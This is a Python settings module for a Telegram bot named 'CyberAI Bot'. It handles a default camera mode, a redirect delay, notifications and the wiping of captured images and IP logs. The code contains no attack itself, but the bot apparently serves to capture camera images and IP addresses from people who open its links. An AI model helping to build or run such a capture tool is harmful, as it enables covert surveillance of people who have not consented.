"""
CyberAI Bot — Settings Handler
User settings management.
"""

import logging
from telegram import Update
from telegram.error import BadRequest
from telegram.ext import ContextTypes, CallbackQueryHandler

from bot.middleware.auth import authorized_only
from bot.utils.keyboards import (
    settings_keyboard, camera_mode_keyboard,
    confirm_clear_keyboard, main_menu_keyboard, back_home_keyboard
)
from bot.utils.messages import cleared_successfully
from bot.utils.helpers import clear_directory, clear_log_file
from bot.config import CAPTURED_DIR, IP_LOGS_DIR, DATA_DIR
from bot.database.session import (
    get_user_setting, set_user_setting, log_activity
)

logger = logging.getLogger(__name__)


async def _safe_edit(query, text, parse_mode="HTML", reply_markup=None):
    """Edit message text, silently ignoring 'message is not modified' errors."""
    try:
        await query.edit_message_text(
            text=text,
            parse_mode=parse_mode,
            reply_markup=reply_markup,
        )
    except BadRequest as e:
        if "message is not modified" not in str(e).lower():
            raise


@authorized_only
async def settings_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show settings menu."""
    query = update.callback_query
    await query.answer()

    user = update.effective_user
    cam_mode = get_user_setting(user.id, "default_cam_mode", "front")
    redirect_time = get_user_setting(user.id, "default_redirect_time", 5)
    notifications = get_user_setting(user.id, "notifications", True)

    mode_emoji = {"front": "📱", "back": "📷", "both": "🔄"}.get(cam_mode, "📷")
    notif_status = "ON" if notifications else "OFF"

    text = (
        "Settings\n"
        "\n"
        f"  {mode_emoji} Default Camera Mode: {cam_mode.upper()}\n"
        f"  Default Redirect Time: {redirect_time}s\n"
        f"  Notifications: {notif_status}\n"
        "\n"
        "Select a setting to change:"
    )

    await _safe_edit(query, text, parse_mode=None, reply_markup=settings_keyboard())


@authorized_only
async def settings_cam_mode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Change default camera mode."""
    query = update.callback_query
    await query.answer()

    context.user_data["settings_changing"] = "cam_mode"

    await _safe_edit(
        query,
        "Select Default Camera Mode:",
        parse_mode=None,
        reply_markup=camera_mode_keyboard(),
    )


@authorized_only
async def settings_cam_mode_set(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set the selected camera mode as default. Called from cam_handler."""
    query = update.callback_query
    await query.answer("Setting saved!")

    mode = query.data.replace("cam_mode_", "")
    user = update.effective_user
    set_user_setting(user.id, "default_cam_mode", mode)
    log_activity(user.id, "settings_change", f"default_cam_mode={mode}")

    context.user_data.pop("settings_changing", None)

    await _safe_edit(
        query,
        f"Default camera mode set to {mode.upper()}",
        parse_mode=None,
        reply_markup=settings_keyboard(),
    )


@authorized_only
async def settings_redirect_time_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Prompt for new default redirect time."""
    query = update.callback_query
    await query.answer()

    from bot.database.session import set_conversation_state
    set_conversation_state(update.effective_user.id, {"flow": "settings", "step": "redirect_time"})

    current = get_user_setting(update.effective_user.id, "default_redirect_time", 5)

    await _safe_edit(
        query,
        f"Enter new default redirect time (seconds):\n\nCurrent: {current}s",
        parse_mode=None,
        reply_markup=back_home_keyboard(),
    )


@authorized_only
async def settings_notifications_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Toggle notifications."""
    query = update.callback_query
    await query.answer()

    user = update.effective_user
    current = get_user_setting(user.id, "notifications", True)
    new_val = not current
    set_user_setting(user.id, "notifications", new_val)

    status = "Enabled" if new_val else "Disabled"
    await _safe_edit(
        query,
        f"Notifications: {status}",
        parse_mode=None,
        reply_markup=settings_keyboard(),
    )


@authorized_only
async def settings_clear_all_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask confirmation before clearing all data."""
    query = update.callback_query
    await query.answer()

    await _safe_edit(
        query,
        "Delete ALL data?\n\n"
        "This will clear:\n"
        "- All captured images\n"
        "- All activity logs\n"
        "- Session data\n\n"
        "This action cannot be undone!",
        parse_mode=None,
        reply_markup=confirm_clear_keyboard("all"),
    )


@authorized_only
async def clear_all_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle clear all confirmation."""
    query = update.callback_query
    await query.answer()

    if query.data == "clear_all_yes":
        captures = clear_directory(CAPTURED_DIR)
        clear_log_file(IP_LOGS_DIR / "activity.log")

        log_activity(update.effective_user.id, "clear_all", f"captures={captures}")

        await _safe_edit(
            query,
            cleared_successfully("All data"),
            reply_markup=main_menu_keyboard(),
        )
    else:
        await _safe_edit(
            query,
            "Data preserved.",
            parse_mode=None,
            reply_markup=settings_keyboard(),
        )


@authorized_only
async def settings_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text inputs for settings."""
    from bot.database.session import get_conversation_state, clear_conversation_state

    user = update.effective_user
    state = get_conversation_state(user.id)

    if state.get("flow") != "settings":
        return

    step = state.get("step")
    text = update.message.text.strip()

    if step == "redirect_time":
        try:
            val = int(text)
            if val < 1 or val > 300:
                raise ValueError
        except (ValueError, TypeError):
            await update.message.reply_text(
                "Please enter a valid number between 1 and 300.",
            )
            return

        set_user_setting(user.id, "default_redirect_time", val)
        clear_conversation_state(user.id)
        log_activity(user.id, "settings_change", f"default_redirect_time={val}")

        await update.message.reply_text(
            f"Default redirect time set to {val}s",
            reply_markup=settings_keyboard(),
        )


def get_handlers():
    """Return all handlers for this module."""
    return [
        CallbackQueryHandler(settings_menu_callback, pattern="^menu_settings$"),
        CallbackQueryHandler(settings_cam_mode_callback, pattern="^settings_cam_mode$"),
        CallbackQueryHandler(settings_redirect_time_callback, pattern="^settings_redirect_time$"),
        CallbackQueryHandler(settings_notifications_callback, pattern="^settings_notifications$"),
        CallbackQueryHandler(settings_clear_all_callback, pattern="^settings_clear_all$"),
        CallbackQueryHandler(clear_all_confirm, pattern="^clear_all_"),
    ]
